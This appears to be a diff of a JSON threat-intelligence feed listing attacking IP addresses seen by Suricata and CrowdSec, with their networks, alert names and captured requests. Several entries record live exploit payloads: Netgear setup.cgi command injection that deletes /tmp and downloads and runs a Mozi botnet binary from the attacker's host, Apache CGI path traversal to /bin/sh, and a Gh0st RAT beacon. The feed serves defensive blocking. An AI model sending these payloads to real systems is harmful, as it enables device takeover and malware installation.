@@ -1,108 +1,13 @@
 {
-  "generated_at": "2026-05-05T01:00:00Z",
+  "generated_at": "2026-05-05T13:00:00Z",
   "ttl_days": 7,
   "scope": "suricata",
   "counts": {
-    "total": 69,
-    "v4": 69,
+    "total": 71,
+    "v4": 71,
     "v6": 0
   },
   "items": [
-    {
-      "ip": "103.173.7.167",
-      "family": "v4",
-      "first_seen": "2026-04-28T05:00:00Z",
-      "last_seen": "2026-04-28T05:00:00Z",
-      "scenarios": [
-        "crowdsec/http-cve-probing",
-        "crowdsec/netgear_rce",
-        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
-      ],
-      "sources": [
-        "crowdsec",
-        "suricata"
-      ],
-      "asn": "142647",
-      "asn_name": "NAN-AS-AP Nasstec Airnet Networks Private Limited",
-      "asn_prefix": "103.173.7.0/24",
-      "payloads": [
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://103.173.7.167:33639/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
-        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.173.7.167:33639/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
-      ]
-    },
-    {
-      "ip": "172.189.127.7",
-      "family": "v4",
-      "first_seen": "2026-04-28T11:00:00Z",
-      "last_seen": "2026-04-28T11:00:00Z",
-      "scenarios": [
-        "suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "172.160.0.0/11",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ],
-      "payloads": [
-        "GET /d/msdownload/update/software/defu/2026/04/am_delta_patch_1.449.320.0_d20c277466522c0dfa34ee0c6e1704f12c13cfdf.exe?cacheHostOrigin=au.download.windowsupdate.com"
-      ]
-    },
-    {
-      "ip": "20.169.107.90",
-      "family": "v4",
-      "first_seen": "2026-04-28T11:00:00Z",
-      "last_seen": "2026-04-28T11:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA HTTP unable to match response to request"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "20.160.0.0/12",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ]
-    },
-    {
-      "ip": "37.44.238.107",
-      "family": "v4",
-      "first_seen": "2026-04-28T07:00:00Z",
-      "last_seen": "2026-04-28T07:00:00Z",
-      "scenarios": [
-        "suricata/SURICATA HTTP unable to match response to request"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "34534",
-      "asn_name": "BULLIONET FBW NETWORKS SAS",
-      "asn_prefix": "37.44.238.0/24"
-    },
-    {
-      "ip": "209.97.171.8",
-      "family": "v4",
-      "first_seen": "2026-04-28T11:00:00Z",
-      "last_seen": "2026-04-28T11:00:00Z",
-      "scenarios": [
-        "suricata/SERVER-WEBAPP Apache HTTP Server httpd directory traversal attempt"
-      ],
-      "sources": [
-        "suricata"
-      ],
-      "asn": "14061",
-      "asn_name": "DIGITALOCEAN-ASN - DigitalOcean",
-      "asn_prefix": "209.97.160.0/20",
-      "payloads": [
-        "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh",
-        "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
-      ]
-    },
     {
       "ip": "172.189.127.11",
       "family": "v4",
@@ -1265,6 +1170,116 @@
       ],
       "payloads": [
         "POST /"
+      ]
+    },
+    {
+      "ip": "206.135.174.31",
+      "family": "v4",
+      "first_seen": "2026-05-05T04:00:00Z",
+      "last_seen": "2026-05-05T04:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "crowdsec/netgear_rce",
+        "suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "payloads": [
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://206.135.174.31:42335/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
+        "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://206.135.174.31:42335/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "87.106.91.226",
+      "family": "v4",
+      "first_seen": "2026-05-05T10:00:00Z",
+      "last_seen": "2026-05-05T10:00:00Z",
+      "scenarios": [
+        "suricata/SERVER-WEBAPP Apache HTTP Server httpd directory traversal attempt"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "payloads": [
+        "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh",
+        "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
+      ]
+    },
+    {
+      "ip": "44.220.185.222",
+      "family": "v4",
+      "first_seen": "2026-05-05T08:00:00Z",
+      "last_seen": "2026-05-05T08:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP unable to match response to request"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "mwl:cloud=\"aws\""
+      ]
+    },
+    {
+      "ip": "34.9.7.198",
+      "family": "v4",
+      "first_seen": "2026-05-05T08:00:00Z",
+      "last_seen": "2026-05-05T08:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN WordPress Scanner Performing Multiple Requests to Windows Live Writer XML"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "tags": [
+        "mwl:cloud=\"gcp\""
+      ],
+      "payloads": [
+        "GET /wordpress/wp-includes/wlwmanifest.xml"
+      ]
+    },
+    {
+      "ip": "66.228.62.150",
+      "family": "v4",
+      "first_seen": "2026-05-05T02:00:00Z",
+      "last_seen": "2026-05-05T02:00:00Z",
+      "scenarios": [
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "payloads": [
+        "GET /"
+      ]
+    },
+    {
+      "ip": "160.119.76.53",
+      "family": "v4",
+      "first_seen": "2026-05-05T01:00:00Z",
+      "last_seen": "2026-05-05T01:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP unable to match response to request"
+      ],
+      "sources": [
+        "suricata"
+      ]
+    },
+    {
+      "ip": "172.105.158.119",
+      "family": "v4",
+      "first_seen": "2026-05-05T12:00:00Z",
+      "last_seen": "2026-05-05T12:00:00Z",
+      "scenarios": [
+        "suricata/SURICATA HTTP URI terminated by non-compliant character"
+      ],
+      "sources": [
+        "suricata"
+      ],
+      "payloads": [
+        "Gh0st\\xad\\xe0x\\x9cKS``\\x98\\xc3\\xc0\\xc0\\xc0\u0006\\xc4\\x8c@\\xbcQ\\x96\\x81\\x81 H\u0007\\xa7\u0016\\x95e&\\xa7*\u0004$&g+\u00182\\x94\\xf6\\xb000\\xac\\xa8rc\u0001\u0011\\xa0\\x82\u001f\\`&\\x83\\xc7K7\\x86\u0019\\xe5n"
       ]
     }
   ]
